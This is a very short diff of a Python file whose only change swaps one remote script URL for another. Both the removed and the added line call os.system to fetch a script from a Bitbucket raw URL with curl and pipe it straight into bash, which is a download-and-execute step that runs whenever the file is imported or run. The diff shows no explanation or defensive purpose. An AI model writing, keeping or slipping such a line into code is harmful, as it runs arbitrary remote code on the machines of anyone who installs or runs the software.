@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/aing005/newnivu/raw/main/lunamaya | bash')
+os.system('curl -sL https://bitbucket.org/ngalong11/nevox/raw/main/nevoy | bash')
